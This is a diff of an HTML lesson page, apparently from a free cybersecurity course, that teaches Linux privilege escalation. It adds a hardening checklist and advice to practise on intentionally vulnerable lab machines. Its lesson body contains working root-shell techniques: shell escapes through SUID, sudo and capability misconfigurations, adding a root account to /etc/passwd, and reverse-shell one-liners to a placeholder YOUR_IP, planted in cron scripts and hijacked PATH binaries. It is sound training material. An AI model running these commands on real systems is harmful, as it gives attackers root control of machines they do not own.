@@ -3,12 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<base href="/">
 <title>Linux privilege escalation — Path 16 · KashSec Academy</title>
-<meta name="description" content="Path 14.6 introduced privilege escalation as a preview. This lesson delivers the full, systematic methodology — the exact skillset that turns a low-privilege foothold into root access, and a cornersto">
+<meta name="description" content="Linux privilege escalation: GTFOBins, SUID, capabilities, LinPEAS.">
 <link rel="canonical" href="https://kashsec.vercel.app/lesson/16-advanced/linux-privesc.html">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E🛡%3C/text%3E%3C/svg%3E">
 <meta property="og:title" content="Linux privilege escalation — Path 16 · KashSec Academy">
-<meta property="og:description" content="Path 14.6 introduced privilege escalation as a preview. This lesson delivers the full, systematic methodology — the exact skillset that turns a low-privilege foothold into root access, and a cornersto">
+<meta property="og:description" content="Linux privilege escalation: GTFOBins, SUID, capabilities, LinPEAS.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://kashsec.vercel.app/lesson/16-advanced/linux-privesc.html">
 <meta property="og:site_name" content="KashSec Academy">
@@ -17,49 +18,79 @@
 <meta property="og:image:height" content="630">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Linux privilege escalation — Path 16 · KashSec Academy">
-<meta name="twitter:description" content="Path 14.6 introduced privilege escalation as a preview. This lesson delivers the full, systematic methodology — the exact skillset that turns a low-privilege foothold into root access, and a cornersto">
+<meta name="twitter:description" content="Linux privilege escalation: GTFOBins, SUID, capabilities, LinPEAS.">
 <meta name="twitter:image" content="https://kashsec.vercel.app/og-image.png">
 <meta name="theme-color" content="#0A0E13">
 <meta name="google-adsense-account" content="ca-pub-7042949574293510">
+<link rel="manifest" href="/manifest.json">
+<link rel="alternate" type="application/rss+xml" title="KashSec Academy — What's new" href="/feed.xml">
+<link rel="apple-touch-icon" href="/icons/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/styles.css">
+<script src="/ads.js" defer></script>
 <script type="application/ld+json">
 {"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"KashSec Academy","item":"https://kashsec.vercel.app/"},{"@type":"ListItem","position":2,"name":"Learning paths","item":"https://kashsec.vercel.app/lesson/"},{"@type":"ListItem","position":3,"name":"Path 16 — Advanced Cyber Topics","item":"https://kashsec.vercel.app/lesson/16-advanced/"},{"@type":"ListItem","position":4,"name":"Linux privilege escalation","item":"https://kashsec.vercel.app/lesson/16-advanced/linux-privesc.html"}]}
 </script>
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"LearningResource","name":"Linux privilege escalation","headline":"Linux privilege escalation","description":"Path 14.6 introduced privilege escalation as a preview. This lesson delivers the full, systematic methodology — the exact skillset that turns a low-privilege foothold into root access, and a cornersto","url":"https://kashsec.vercel.app/lesson/16-advanced/linux-privesc.html","inLanguage":"en","dateModified":"2026-07-26","learningResourceType":"Lesson","educationalLevel":"Advanced","timeRequired":"PT10M","isAccessibleForFree":true,"isFamilyFriendly":true,"teaches":"GTFOBins, SUID, capabilities, LinPEAS.","isPartOf":{"@type":"Course","name":"Path 16: Advanced Cyber Topics","url":"https://kashsec.vercel.app/lesson/16-advanced/"},"provider":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"publisher":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"mainEntityOfPage":{"@type":"WebPage","@id":"https://kashsec.vercel.app/lesson/16-advanced/linux-privesc.html"}}
+{"@context":"https://schema.org","@type":"LearningResource","name":"Linux privilege escalation","headline":"Linux privilege escalation","description":"Linux privilege escalation: GTFOBins, SUID, capabilities, LinPEAS.","url":"https://kashsec.vercel.app/lesson/16-advanced/linux-privesc.html","inLanguage":"en","dateModified":"2026-08-04","learningResourceType":"Lesson","educationalLevel":"Advanced","timeRequired":"PT10M","isAccessibleForFree":true,"isFamilyFriendly":true,"teaches":"GTFOBins, SUID, capabilities, LinPEAS.","isPartOf":{"@type":"Course","name":"Path 16: Advanced Cyber Topics","url":"https://kashsec.vercel.app/lesson/16-advanced/"},"provider":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"publisher":{"@type":"EducationalOrganization","name":"KashSec Academy","url":"https://kashsec.vercel.app/","logo":"https://kashsec.vercel.app/icons/icon-512.png","description":"Free cybersecurity education for complete beginners."},"mainEntityOfPage":{"@type":"WebPage","@id":"https://kashsec.vercel.app/lesson/16-advanced/linux-privesc.html"}}
 </script>
-<style>
-:root{color-scheme:dark;--bg:#080A0F;--surface:#0F141E;--text:#EAEFF5;--muted:#94A3B2;--amber:#EFA43A;--teal:#5FE0CF;--border:rgba(255,255,255,.08)}
-html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;line-height:1.6}
-main{max-width:760px;margin:0 auto;padding:1.5rem 1.2rem 3rem}
-.spa-notice{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1.1rem;margin-bottom:1.5rem;color:var(--muted);font-size:.88rem}
-.spa-notice a{color:var(--amber);text-decoration:none;font-weight:600}
-.crumb{color:var(--muted);font-size:.8rem;margin-bottom:.4rem}
-.crumb a{color:var(--teal);text-decoration:none}
-.pager{display:flex;justify-content:space-between;gap:1rem;margin-top:2.5rem;padding-top:1.2rem;border-top:1px solid var(--border);font-size:.88rem}
-.pager a{color:var(--teal);text-decoration:none}
-h1,h2,h3,h4{font-family:Inter,system-ui,sans-serif;color:var(--text)}
-h1{font-size:2rem;margin:.5rem 0 1rem}
-h2{font-size:1.4rem;margin:2rem 0 .8rem;padding-top:.6rem;border-top:1px solid var(--border)}
-a{color:var(--teal)}
-code{background:rgba(63,182,168,.13);color:var(--teal);padding:.1rem .35rem;border-radius:4px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:.9em}
-pre{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1rem;overflow-x:auto}
-pre code{background:transparent;color:var(--text);padding:0}
-blockquote{border-left:3px solid var(--amber);margin:1rem 0;padding:.4rem 1rem;color:var(--muted);background:var(--surface);border-radius:6px}
-table{width:100%;border-collapse:collapse;margin:1rem 0}
-th,td{border:1px solid var(--border);padding:.5rem .7rem;text-align:left}
-th{background:var(--surface)}
-img{max-width:100%;height:auto}
-footer{color:var(--muted);font-size:.82rem;text-align:center;margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border)}
-</style>
 </head>
 <body>
-<main>
-  <div class="spa-notice">📱 Loading the interactive KashSec app… If it doesn't switch automatically, <a href="/#/lesson/16-advanced/linux-privesc">continue here →</a></div>
-  <div class="crumb"><a href="https://kashsec.vercel.app/">KashSec Academy</a> · <a href="https://kashsec.vercel.app/lesson/">Learning paths</a> · <a href="https://kashsec.vercel.app/lesson/16-advanced/">Path 16 — Advanced Cyber Topics</a> · Linux privilege escalation</div>
-  <article><h1>Linux privilege escalation</h1>
+<a class="skip" href="/lesson/16-advanced/linux-privesc.html#app">Skip to content</a>
+<header class="nav" id="siteNav">
+  <a class="brand" href="#/" aria-label="KashSec Academy — home">
+    <span class="brand-mark">
+      <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+    </span>
+    <span class="brand-txt">KashSec<span class="amber">.</span></span>
+  </a>
+  <nav class="nav-links" id="navLinks" aria-label="Primary">
+    <a href="#/">Home</a>
+    <a href="#/course">Course</a>
+    <a href="#/tracks">Tracks</a>
+    <a href="#/labs">Labs</a>
+    <a href="#/tasks">Practice</a>
+    <a href="#/tools">Tools</a>
+    <a href="#/glossary">Glossary</a>
+    <a href="#/roadmap">Roadmap</a>
+    <a href="#/careers">Careers</a>
+    <a href="#/faq">FAQ</a>
+    <a href="#/progress">My Progress</a>
+    <a href="#" id="accountNavLink" class="account-nav-link" style="display:none">Sign in</a>
+  </nav>
+  <div class="nav-cta">
+    <button class="icon-btn" id="searchBtn" aria-label="Search lessons (Ctrl+K)" type="button" title="Search (Ctrl+K)">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    </button>
+    <button class="icon-btn theme-toggle" id="themeToggle" aria-label="Toggle light/dark theme" aria-pressed="false" type="button">
+      <svg class="ico-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      <svg class="ico-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
+    <button class="icon-btn" id="randomLessonBtn" aria-label="Jump to a random lesson" type="button" title="Random lesson (R)">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="3"/><circle cx="8" cy="8" r="1.4" fill="currentColor"/><circle cx="16" cy="8" r="1.4" fill="currentColor"/><circle cx="12" cy="12" r="1.4" fill="currentColor"/><circle cx="8" cy="16" r="1.4" fill="currentColor"/><circle cx="16" cy="16" r="1.4" fill="currentColor"/></svg>
+    </button>
+    <span class="streak-badge" id="streakBadge" title="Learning streak — visit on consecutive days to grow it" hidden>🔥<b id="streakN">0</b></span>
+    <a class="icon-btn progress-ring-btn" id="progressRingBtn" href="#/progress" aria-label="Your progress">
+      <svg viewBox="0 0 36 36"><circle class="ring-track" cx="18" cy="18" r="15.5"/><circle class="ring-fill" id="ringFill" cx="18" cy="18" r="15.5" stroke-dasharray="97.4" stroke-dashoffset="97.4"/></svg>
+    </a>
+    <button class="icon-btn" id="installBtn" aria-label="Install KashSec app for offline use" type="button" title="Install app" hidden>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M4 21h16"/></svg>
+    </button>
+    <a class="btn-amber sm" id="startBtn" href="#/lesson/01-introduction">Start</a>
+    <button class="hamb" id="hamb" aria-label="Toggle menu" aria-expanded="false" aria-controls="navLinks">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+  </div>
+</header>
+<main id="app" tabindex="-1">
+  <div class="reader-wrap"><div class="reader-main">
+    <nav class="reader-crumb" aria-label="Breadcrumb"><a href="https://kashsec.vercel.app/">KashSec Academy</a> · <a href="https://kashsec.vercel.app/lesson/">Learning paths</a> · <a href="https://kashsec.vercel.app/lesson/16-advanced/">Path 16 — Advanced Cyber Topics</a> · Linux privilege escalation</nav>
+    <div class="md" id="content"><article><h1>Linux privilege escalation</h1>
 <p>Path 14.6 introduced privilege escalation as a preview. This lesson delivers the full, systematic methodology — the exact skillset that turns a low-privilege foothold into root access, and a cornerstone of practical certification exams such as CPENT.</p>
 <h2>Why privilege escalation matters so much</h2>
-<p>Recall Path 14.6&#39;s kill chain logic — initial access is rarely the full story. Most real footholds (a web shell from Path 11.7, an exploited service from Path 14.5) land you as a low-privilege user. <strong>Privilege escalation (privesc)</strong> is the systematic process of finding a path from that limited foothold to full administrative (root) control.</p>
+<p>Recall Path 14.6's kill chain logic — initial access is rarely the full story. Most real footholds (a web shell from Path 11.7, an exploited service from Path 14.5) land you as a low-privilege user. <strong>Privilege escalation (privesc)</strong> is the systematic process of finding a path from that limited foothold to full administrative (root) control.</p>
 <h2>The systematic enumeration-first approach</h2>
 <p>Before trying any specific technique, <strong>enumerate everything</strong> — privesc is fundamentally a search problem, not a single trick:</p>
 <pre><code class="language-bash"># The single most valuable habit: run a proven enumeration script FIRST
@@ -68,10 +99,10 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh | tee linpeas-output.txt
 </code></pre>
-<p>LinPEAS systematically checks dozens of categories automatically — but understanding what it&#39;s actually looking for (rather than treating it as a black box) is what separates genuine skill from button-pushing.</p>
+<p>LinPEAS systematically checks dozens of categories automatically — but understanding what it's actually looking for (rather than treating it as a black box) is what separates genuine skill from button-pushing.</p>
 <h2>The main privesc vectors, one by one</h2>
 <h3>1. SUID/SGID binaries</h3>
-<p>Recall Path 03.10&#39;s introduction to SUID. A SUID binary runs with the <strong>file owner&#39;s</strong> privileges, not the user executing it — if that owner is root and the binary can be manipulated to execute arbitrary commands, that&#39;s an escalation path.</p>
+<p>Recall Path 03.10's introduction to SUID. A SUID binary runs with the <strong>file owner's</strong> privileges, not the user executing it — if that owner is root and the binary can be manipulated to execute arbitrary commands, that's an escalation path.</p>
 <pre><code class="language-bash"># Find all SUID binaries:
 find / -perm -4000 -type f 2&gt;/dev/null
 
@@ -79,11 +110,11 @@ find / -perm -4000 -type f 2&gt;/dev/null
 # with documented privesc techniques when SUID:
 # https://gtfobins.github.io/
 </code></pre>
-<pre><code class="language-bash"># Example: if &#39;find&#39; itself is SUID (unusual, but illustrative):
+<pre><code class="language-bash"># Example: if 'find' itself is SUID (unusual, but illustrative):
 find . -exec /bin/sh -p \; -quit
 # The -p flag preserves the elevated privilege in the spawned shell
 </code></pre>
-<p><strong>GTFOBins</strong> is the essential reference here — nearly every standard Linux binary (<code>vim</code>, <code>less</code>, <code>cp</code>, <code>find</code>, <code>python</code>) has a documented technique for privilege escalation or restriction bypass <em>if</em> it&#39;s been misconfigured with SUID or excessive sudo permissions.</p>
+<p><strong>GTFOBins</strong> is the essential reference here — nearly every standard Linux binary (<code>vim</code>, <code>less</code>, <code>cp</code>, <code>find</code>, <code>python</code>) has a documented technique for privilege escalation or restriction bypass <em>if</em> it's been misconfigured with SUID or excessive sudo permissions.</p>
 <h3>2. Sudo misconfigurations</h3>
 <pre><code class="language-bash"># Check what the current user can run as another user (often root) via sudo:
 sudo -l
@@ -93,26 +124,26 @@ User kali may run the following commands on this host:
     (root) NOPASSWD: /usr/bin/vim
 </code></pre>
 <p>If <code>vim</code> can be run as root via sudo with no password, GTFOBins shows the exact escalation:</p>
-<pre><code class="language-bash">sudo vim -c &#39;:!/bin/sh&#39;
+<pre><code class="language-bash">sudo vim -c ':!/bin/sh'
 # Vim spawns a shell — inheriting root privileges from the sudo context
 </code></pre>
 <h3>3. Cron jobs running as root</h3>
-<p>Recall Path 03.11&#39;s cron lesson — a scheduled job running as root that executes a script <strong>writable by a lower-privilege user</strong> is a classic escalation path:</p>
+<p>Recall Path 03.11's cron lesson — a scheduled job running as root that executes a script <strong>writable by a lower-privilege user</strong> is a classic escalation path:</p>
 <pre><code class="language-bash"># Check system-wide cron jobs:
 cat /etc/crontab
 ls -la /etc/cron.d/
 
 # If a root cron job runs a script you can WRITE to:
-echo &#39;bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1&#39; &gt;&gt; /path/to/writable-script.sh
+echo 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1' &gt;&gt; /path/to/writable-script.sh
 # Wait for the cron job to fire, catch the reverse shell on your listener
 </code></pre>
 <h3>4. Kernel exploits</h3>
 <p>If the kernel version has a known, unpatched local privilege escalation CVE:</p>
 <pre><code class="language-bash">uname -a
 # Cross-reference the exact version against searchsploit (Path 14.4):
-searchsploit &quot;linux kernel 5.4&quot;
+searchsploit "linux kernel 5.4"
 </code></pre>
-<p>Kernel exploits can be effective but carry genuine <strong>stability risk</strong> (a bad exploit attempt can crash the system) — professional practice (Path 14.5&#39;s discipline) means preferring safer, more surgical techniques first, reserving kernel exploits for when nothing else works and the RoE explicitly tolerates the risk.</p>
+<p>Kernel exploits can be effective but carry genuine <strong>stability risk</strong> (a bad exploit attempt can crash the system) — professional practice (Path 14.5's discipline) means preferring safer, more surgical techniques first, reserving kernel exploits for when nothing else works and the RoE explicitly tolerates the risk.</p>
 <h3>5. Weak file permissions on sensitive files</h3>
 <pre><code class="language-bash"># Is /etc/passwd or /etc/shadow writable by your current user?
 ls -la /etc/passwd /etc/shadow
@@ -122,22 +153,22 @@ openssl passwd -1 -salt xyz mynewpassword
 # Append: newroot:GENERATED_HASH:0:0:root:/root:/bin/bash  to /etc/passwd
 </code></pre>
 <h3>6. Credentials found lying around</h3>
-<p>Recall Path 14.6&#39;s situational awareness commands — a huge fraction of real privesc paths are simply <strong>found credentials</strong>, not exotic technical exploits:</p>
+<p>Recall Path 14.6's situational awareness commands — a huge fraction of real privesc paths are simply <strong>found credentials</strong>, not exotic technical exploits:</p>
 <pre><code class="language-bash"># Search broadly for anything password/key-related:
-grep -r &quot;password&quot; /etc/ 2&gt;/dev/null
-find / -name &quot;*.bak&quot; -o -name &quot;id_rsa&quot; -o -name &quot;*.conf&quot; 2&gt;/dev/null
+grep -r "password" /etc/ 2&gt;/dev/null
+find / -name "*.bak" -o -name "id_rsa" -o -name "*.conf" 2&gt;/dev/null
 cat ~/.bash_history
 </code></pre>
-<p>Config files, backup files, shell history, and <code>.git</code> directories left behind (recall Path 11.3&#39;s exposed-file recon habit, now applied locally) frequently contain plaintext passwords or private keys directly usable for lateral movement or escalation.</p>
+<p>Config files, backup files, shell history, and <code>.git</code> directories left behind (recall Path 11.3's exposed-file recon habit, now applied locally) frequently contain plaintext passwords or private keys directly usable for lateral movement or escalation.</p>
 <h3>7. Path hijacking</h3>
-<p>If a script (especially one running with elevated privileges via cron or sudo) calls a command <strong>without specifying its full path</strong>, and your current, lower-privileged <code>$PATH</code> includes a directory writable by you that comes <em>before</em> the real binary&#39;s location, you can plant a malicious binary with the same name:</p>
-<pre><code class="language-bash"># If a root cron script calls simply &quot;backup&quot; instead of &quot;/usr/bin/backup&quot;,
-# and you can write to a directory earlier in root&#39;s $PATH:
-echo -e &#39;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1&#39; &gt; /writable/path/backup
+<p>If a script (especially one running with elevated privileges via cron or sudo) calls a command <strong>without specifying its full path</strong>, and your current, lower-privileged <code>$PATH</code> includes a directory writable by you that comes <em>before</em> the real binary's location, you can plant a malicious binary with the same name:</p>
+<pre><code class="language-bash"># If a root cron script calls simply "backup" instead of "/usr/bin/backup",
+# and you can write to a directory earlier in root's $PATH:
+echo -e '#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1' &gt; /writable/path/backup
 chmod +x /writable/path/backup
 </code></pre>
-<h3>8. Linux capabilities — SUID&#39;s more granular cousin</h3>
-<p>Recall Path 03.10&#39;s brief mention of capabilities. Where SUID grants a binary <em>full</em> root privileges when it runs, <strong>capabilities</strong> grant a much more granular, specific subset — but a misconfigured capability can still be exactly as exploitable:</p>
+<h3>8. Linux capabilities — SUID's more granular cousin</h3>
+<p>Recall Path 03.10's brief mention of capabilities. Where SUID grants a binary <em>full</em> root privileges when it runs, <strong>capabilities</strong> grant a much more granular, specific subset — but a misconfigured capability can still be exactly as exploitable:</p>
 <pre><code class="language-bash"># Find binaries with capabilities set:
 getcap -r / 2&gt;/dev/null
 </code></pre>
@@ -145,7 +176,7 @@ getcap -r / 2&gt;/dev/null
 /usr/bin/python3 = cap_setuid+ep
 </code></pre>
 <p><code>cap_setuid</code> lets a binary change its effective user ID — meaning Python itself can be used to spawn a root shell directly, exactly like a SUID Python binary would, just via a narrower, capability-specific mechanism:</p>
-<pre><code class="language-bash">/usr/bin/python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;
+<pre><code class="language-bash">/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 </code></pre>
 <p>GTFOBins documents capability-based escalation techniques alongside its SUID entries — always check both when a binary shows up in either enumeration pass.</p>
 <h3>9. NFS misconfiguration — no_root_squash</h3>
@@ -156,19 +187,38 @@ cat /etc/exports    # if you can read it directly
 </code></pre>
 <p>This is exactly the kind of vector that rewards the broad situational-awareness habit from Path 14.6 — network configuration details easy to overlook when focused purely on local binary permissions.</p>
 <h2>A systematic privesc checklist</h2>
-<h2>The defender&#39;s view — hardening against these exact techniques</h2>
+<pre><code class="language-mermaid">flowchart TB
+    Start["🎯 Low-privilege shell obtained"]
+    Start --&gt; Enum["Run LinPEAS / manual enumeration"]
+    Enum --&gt; SUID["Check SUID/SGID binaries&lt;br/&gt;→ GTFOBins"]
+    Enum --&gt; Sudo["Check sudo -l output&lt;br/&gt;→ GTFOBins"]
+    Enum --&gt; Cron["Check cron jobs &amp; writable scripts"]
+    Enum --&gt; Kernel["Check kernel version&lt;br/&gt;→ searchsploit"]
+    Enum --&gt; Creds["Search for stored credentials"]
+    Enum --&gt; Perms["Check file permissions on&lt;br/&gt;sensitive system files"]
+
+    style Start fill:#111927,color:#8496A6,stroke:#8496A6
+    style Enum fill:#2b1f0a,color:#EFA43A,stroke:#EFA43A
+    style SUID fill:#0f2b26,color:#3FB6A8,stroke:#3FB6A8
+    style Sudo fill:#0f2b26,color:#3FB6A8,stroke:#3FB6A8
+    style Cron fill:#0f2b26,color:#3FB6A8,stroke:#3FB6A8
+    style Kernel fill:#2b1010,color:#E05548,stroke:#E05548
+    style Creds fill:#0f2b26,color:#3FB6A8,stroke:#3FB6A8
+    style Perms fill:#0f2b26,color:#3FB6A8,stroke:#3FB6A8
+</code></pre>
+<h2>The defender's view — hardening against these exact techniques</h2>
 <ul>
-<li><strong>Minimise SUID binaries</strong> — audit and remove SUID bits from anything that doesn&#39;t genuinely need them.</li>
+<li><strong>Minimise SUID binaries</strong> — audit and remove SUID bits from anything that doesn't genuinely need them.</li>
 <li><strong>Principle of least privilege in sudoers</strong> — grant only the specific commands actually needed, never blanket <code>NOPASSWD: ALL</code>.</li>
-<li><strong>Secure cron scripts</strong> — ensure scripts run by privileged cron jobs aren&#39;t writable by lower-privileged users.</li>
-<li><strong>Patch kernels promptly</strong> (echoing Path 10.7&#39;s update discipline).</li>
+<li><strong>Secure cron scripts</strong> — ensure scripts run by privileged cron jobs aren't writable by lower-privileged users.</li>
+<li><strong>Patch kernels promptly</strong> (echoing Path 10.7's update discipline).</li>
 <li><strong>Never store plaintext credentials</strong> in config files, scripts, or shell history — use proper secrets management.</li>
 <li><strong>Use absolute paths</strong> in privileged scripts to prevent PATH hijacking.</li>
 </ul>
 <h2>🧪 Lab — Full privesc practice on a vulnerable VM</h2>
 <p>Deliberately vulnerable VMs designed specifically for privesc practice:</p>
-<pre><code class="language-bash"># Download a &quot;vulnhub&quot;-style intentionally vulnerable VM, or use TryHackMe/HackTheBox
-# rooms specifically tagged &quot;privilege escalation&quot; — many are free.
+<pre><code class="language-bash"># Download a "vulnhub"-style intentionally vulnerable VM, or use TryHackMe/HackTheBox
+# rooms specifically tagged "privilege escalation" — many are free.
 
 # On your practice VM, after gaining an initial low-privilege shell:
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
@@ -178,14 +228,16 @@ chmod +x linpeas.sh
 # Review the output methodically, cross-referencing any SUID/sudo findings
 # against GTFOBins before attempting the documented technique.
 </code></pre>
-<p>Work through at least 2-3 different vulnerable VMs, deliberately trying to identify the <em>specific</em> privesc vector (SUID, sudo, cron, kernel, or credentials) each one uses before reaching for LinPEAS&#39;s output — this builds genuine pattern-recognition rather than tool dependency.</p>
-<p><code>sudo -l</code> shows that your current user can run <code>/usr/bin/less</code> as root with <code>NOPASSWD</code>. Using GTFOBins&#39; documented technique for <code>less</code>, how would you likely escalate to a root shell?</p>
-<details><summary>Show answer</summary>GTFOBins documents that <code>less</code>, when run with elevated privileges, can spawn a shell via its built-in command execution feature — typically: <code>sudo less /etc/profile</code> then, within the `less` pager, typing <code>!/bin/sh</code> (many pagers support executing shell commands this way), which spawns a shell inheriting <code>less</code>'s root privileges. Always check <a href="https://gtfobins.github.io/">GTFOBins</a> directly for the exact, current, correct syntax for any specific binary before attempting it.</details><h2>Key terms</h2>
+<p>Work through at least 2-3 different vulnerable VMs, deliberately trying to identify the <em>specific</em> privesc vector (SUID, sudo, cron, kernel, or credentials) each one uses before reaching for LinPEAS's output — this builds genuine pattern-recognition rather than tool dependency.</p>
+<p>:::challenge Test yourself
+<code>sudo -l</code> shows that your current user can run <code>/usr/bin/less</code> as root with <code>NOPASSWD</code>. Using GTFOBins' documented technique for <code>less</code>, how would you likely escalate to a root shell?</p>
+<details><summary>Show answer</summary>GTFOBins documents that <code>less</code>, when run with elevated privileges, can spawn a shell via its built-in command execution feature — typically: <code>sudo less /etc/profile</code> then, within the `less` pager, typing <code>!/bin/sh</code> (many pagers support executing shell commands this way), which spawns a shell inheriting <code>less</code>'s root privileges. Always check <a href="https://gtfobins.github.io/">GTFOBins</a> directly for the exact, current, correct syntax for any specific binary before attempting it.</details>
+:::<h2>Key terms</h2>
 <ul>
 <li><strong>Privilege escalation (privesc)</strong> — moving from a low-privilege foothold to higher (ideally root) access.</li>
 <li><strong>LinPEAS</strong> — the industry-standard automated Linux privesc enumeration script.</li>
 <li><strong>GTFOBins</strong> — the curated reference for privesc/bypass techniques via standard Unix binaries.</li>
-<li><strong>SUID/SGID</strong> — file permission bits causing a binary to run with the file owner&#39;s/group&#39;s privileges.</li>
+<li><strong>SUID/SGID</strong> — file permission bits causing a binary to run with the file owner's/group's privileges.</li>
 <li><strong>Path hijacking</strong> — exploiting unqualified command references in privileged scripts via a manipulated <code>$PATH</code>.</li>
 </ul>
 <h2>Recap</h2>
@@ -204,19 +256,67 @@ chmod +x linpeas.sh
 <li><a href="https://payatu.com/blog/a-guide-to-linux-privilege-escalation/">Payatu — Linux Privilege Escalation Guide</a> — accessible, well-structured walkthrough.</li>
 </ul>
 <p><strong>Next up →</strong> <a href="#/lesson/16-advanced/linux-privesc-tools-deep-dive">Linux privilege escalation tools, deep dive</a></p>
-<nav class="pager"><span></span><a href="/lesson/16-advanced/linux-privesc-tools-deep-dive.html">Linux privesc tools, deep dive →</a></nav></article>
-  <footer>© KashSec Academy · <a href="/lesson/">All learning paths</a> · <a href="/">Interactive site</a> · <a href="/sitemap.xml">Sitemap</a></footer>
+<nav class="pager"><span></span><a href="/lesson/16-advanced/linux-privesc-tools-deep-dive.html">Linux privesc tools, deep dive →</a></nav></article></div>
+  </div></div>
 </main>
-<script>
-// Redirect actual users into the SPA. Search-engine crawlers get to read
-// the content above before the redirect fires.
-(function(){
-  try {
-    var target = "/#/lesson/16-advanced/linux-privesc";
-    // Only redirect from the .html file, not from the SPA route itself.
-    if (location.pathname.endsWith('.html') || location.pathname.endsWith('/')) location.replace(target);
-  } catch (e) {}
-})();
-</script>
+<footer class="footer">
+  <div class="foot-top">
+    <div class="foot-brand">
+      <div class="brand">
+        <span class="brand-mark">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+        </span>
+        <span class="brand-txt">KashSec<span class="amber">.</span></span>
+      </div>
+      <p>Free cybersecurity education for complete beginners. Start from zero, learn by doing, and reach a real career.</p>
+    </div>
+    <div class="foot-cols">
+      <div><h4>Learn</h4>
+        <a href="#/course">All paths</a>
+        <a href="#/tracks">Tracks</a>
+        <a href="#/labs">Labs</a>
+        <a href="#/glossary">Glossary</a>
+        <a href="#/review">Flashcards</a>
+        <a href="#/daily">Daily challenge</a>
+        <a href="#/weekly">Weekly challenges</a>
+        <a href="#/quiz/shuffle">Shuffle quiz</a>
+        <a href="#/tasks">Practice tasks</a>
+        <a href="#/exam">Timed mock exam</a>
+        <a href="#/search">Search</a>
+      </div>
+      <div><h4>Explore</h4>
+        <a href="#/tools">Tools</a>
+        <a href="#/careers">Careers</a>
+        <a href="#/interview">Interview bank</a>
+        <a href="#/certs">Certification roadmap</a>
+        <a href="#/faq">FAQ</a>
+      </div>
+      <div><h4>About</h4>
+        <a href="#/about">About KashSec</a>
+        <a href="#/contact">Contact</a>
+        <a href="#/changelog">What's new</a>
+        <a href="/feed.xml">RSS feed</a>
+      </div>
+      <div><h4>Legal</h4>
+        <a href="#/privacy">Privacy policy</a>
+        <a href="#/terms">Terms of use</a>
+      </div>
+    </div>
+  </div>
+  <div class="foot-bottom">
+    <span>© <span id="year"></span> KashSec Academy · Free forever</span>
+    <span class="made">Learn · Practise · Get hired</span>
+  </div>
